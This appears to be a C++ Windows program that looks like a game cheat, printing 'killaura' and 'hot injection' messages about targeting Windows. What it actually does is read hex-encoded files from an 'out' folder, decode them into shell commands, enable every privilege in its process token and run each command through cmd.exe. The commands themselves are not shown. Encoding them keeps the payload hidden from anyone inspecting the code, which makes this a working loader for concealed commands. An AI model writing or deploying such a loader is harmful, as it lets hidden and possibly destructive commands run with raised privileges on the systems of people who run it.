#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>
#include <filesystem>
#include <cstdlib>
#include <cstring>
#include <windows.h>
#include <shellapi.h>
#include <thread>
#include <chrono>

using namespace std::chrono_literals;

// 定义RtlGetVersion函数
typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

// 获取Windows Build版本（使用RtlGetVersion）
std::string getWindowsBuild() {
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	if (hNtdll) {
		RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
		if (RtlGetVersion) {
			RTL_OSVERSIONINFOW osVersion = {0};
			osVersion.dwOSVersionInfoSize = sizeof(osVersion);
			if (RtlGetVersion(&osVersion) == 0) { // STATUS_SUCCESS
				return std::to_string(osVersion.dwBuildNumber);
			}
		}
	}
	return "未知";
}

// 密码验证和交互式界面
bool verifyPasswordWithInteraction() {
	std::cout << "输入y继续" << std::endl;
	std::cout << "Type Here: ";
	
	std::string inputPassword;
	std::getline(std::cin, inputPassword);
	
	const std::string correctPassword = "y";
	
	if (inputPassword != correctPassword) {
		std::cout << "即将退出！" << std::endl;
		return false;
	}
	
	// 交互式输出
	std::cout << "\n验证通过！" << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::cout << "正在加载配置..." << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::cout << "正在准备脱盒..." << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::cout << "正在准备热注入..." << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::cout << "已打开：killaura" << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::string build = getWindowsBuild();
	std::cout << "killaura：检测到敌人 名称 Windows Build :" << build << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::cout << "即将kill..." << std::endl;
	std::this_thread::sleep_for(100ms);
	
	std::cout << "\n开始执行命令..." << std::endl;
	std::this_thread::sleep_for(200ms);
	
	return true;
}

// 从16进制字符串还原为原始字符串
std::string hexToString(const std::string& hex) {
	std::string result;
	
	if (hex.length() % 2 != 0) {
		return result;
	}
	
	for (size_t i = 0; i < hex.length(); i += 2) {
		std::string byteString = hex.substr(i, 2);
		try {
			char byte = static_cast<char>(std::stoi(byteString, nullptr, 16));
			result += byte;
		} catch (...) {
			return "";
		}
	}
	
	return result;
}

// 加载文件
std::vector<std::string> loadHexFiles(const std::string& directory) {
	std::vector<std::string> hexContents;
	std::vector<std::string> filePaths;
	
	try {
		for (const auto& entry : std::filesystem::directory_iterator(directory)) {
			if (entry.is_regular_file()) {
				filePaths.push_back(entry.path().string());
			}
		}
		
		std::sort(filePaths.begin(), filePaths.end());
		
		for (const auto& filePath : filePaths) {
			std::ifstream file(filePath, std::ios::binary);
			if (file.is_open()) {
				std::stringstream buffer;
				buffer << file.rdbuf();
				hexContents.push_back(buffer.str());
				file.close();
			}
		}
	} catch (...) {
		return std::vector<std::string>();
	}
	
	return hexContents;
}

// 分割命令为单独行
std::vector<std::string> splitCommandsByLine(const std::string& commandText) {
	std::vector<std::string> commands;
	std::stringstream ss(commandText);
	std::string line;
	
	while (std::getline(ss, line)) {
		line.erase(0, line.find_first_not_of(" \t\r\n"));
		line.erase(line.find_last_not_of(" \t\r\n") + 1);
		
		if (!line.empty() && line[0] != '#') {
			commands.push_back(line);
		}
	}
	
	return commands;
}

// 获取所有特权
DWORD GetAllPrivilege(PHANDLE pToken) {
	DWORD dwErr = 0;
	
	if (!pToken) {
		return ERROR_INVALID_HANDLE;
	}
	
	LPCWSTR lpAllPrivilege[] = {
		L"SeIncreaseQuotaPrivilege",
		L"SeSecurityPrivilege",
		L"SeTakeOwnershipPrivilege",
		L"SeLoadDriverPrivilege",
		L"SeSystemProfilePrivilege",
		L"SeSystemtimePrivilege",
		L"SeProfileSingleProcessPrivilege",
		L"SeIncreaseBasePriorityPrivilege",
		L"SeCreatePagefilePrivilege",
		L"SeBackupPrivilege",
		L"SeRestorePrivilege",
		L"SeShutdownPrivilege",
		L"SeDebugPrivilege",
		L"SeSystemEnvironmentPrivilege",
		L"SeChangeNotifyPrivilege",
		L"SeRemoteShutdownPrivilege",
		L"SeUndockPrivilege",
		L"SeManageVolumePrivilege",
		L"SeImpersonatePrivilege",
		L"SeCreateGlobalPrivilege",
		L"SeIncreaseWorkingSetPrivilege",
		L"SeTimeZonePrivilege",
		L"SeCreateSymbolicLinkPrivilege",
		L"SeSyncAgentPrivilege",
		L"SeCreatePermanentPrivilege",
		L"SeTcbPrivilege",
		L"SeCreateTokenPrivilege",
		L"SeAssignPrimaryTokenPrivilege",
		L"SeLockMemoryPrivilege",
		L"SeMachineAccountPrivilege",
		L"SeAuditPrivilege",
		L"SeTrustedCredManAccessPrivilege",
		L"SeRelabelPrivilege",
		L"SeEnableDelegationPrivilege",
	};
	
	int privilegeCount = sizeof(lpAllPrivilege) / sizeof(lpAllPrivilege[0]);
	
	for (int i = 0; i < privilegeCount; ++i) {
		LUID Luid;
		if (LookupPrivilegeValueW(NULL, lpAllPrivilege[i], &Luid)) {
			TOKEN_PRIVILEGES TokenPrivileges;
			TokenPrivileges.PrivilegeCount = 1;
			TokenPrivileges.Privileges[0].Luid = Luid;
			TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			
			if (!AdjustTokenPrivileges(*pToken, FALSE, &TokenPrivileges, 
									   sizeof(TokenPrivileges), NULL, NULL)) {
				dwErr = GetLastError();
				break;
			}
		} else {
			dwErr = GetLastError();
			break;
		}
	}
	
	return dwErr;
}

// 为当前进程开启所有特权
bool enableAllPrivilegesForProcess() {
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), 
						  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
						  &hToken)) {
		return false;
	}
	
	DWORD result = GetAllPrivilege(&hToken);
	CloseHandle(hToken);
	
	return result == ERROR_SUCCESS;
}

// 为单条命令创建进程
void createProcessForCommand(const std::string& command) {
	if (command.empty()) return;
	
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	ZeroMemory(&si, sizeof(STARTUPINFOA));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	
	si.cb = sizeof(STARTUPINFOA);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	
	std::string fullCommand = "cmd.exe /c \"" + command + "\"";
	char* cmdLine = new char[fullCommand.length() + 1];
	strcpy(cmdLine, fullCommand.c_str());
	
	CreateProcessA(
				   NULL,
				   cmdLine,
				   NULL,
				   NULL,
				   FALSE,
				   CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
				   NULL,
				   NULL,
				   &si,
				   &pi
				   );
	
	delete[] cmdLine;
	
	if (pi.hProcess) CloseHandle(pi.hProcess);
	if (pi.hThread) CloseHandle(pi.hThread);
}

// 同时为所有命令创建进程
void executeAllCommands(const std::vector<std::string>& commands) {
	// 为当前进程启用所有特权
	enableAllPrivilegesForProcess();
	
	// 为每条命令同时创建进程
	for (const auto& command : commands) {
		createProcessForCommand(command);
	}
}

int main() {
	// 密码验证和交互式界面
	if (!verifyPasswordWithInteraction()) {
		return 1;
	}
	
	// 检查目录
	if (!std::filesystem::exists("out")) {
		return 1;
	}
	
	// 加载文件
	auto hexBlocks = loadHexFiles("out");
	if (hexBlocks.empty()) {
		return 1;
	}
	
	// 合并16进制数据
	std::string combinedHex;
	for (const auto& block : hexBlocks) {
		combinedHex += block;
	}
	
	// 还原命令
	std::string commandText = hexToString(combinedHex);
	if (commandText.empty()) {
		return 1;
	}
	
	// 分割命令
	auto commands = splitCommandsByLine(commandText);
	if (commands.empty()) {
		return 1;
	}
	
	std::this_thread::sleep_for(100ms);
	
	// 同时为所有命令创建进程
	executeAllCommands(commands);
	
	std::this_thread::sleep_for(500ms);
	
	return 0;
}
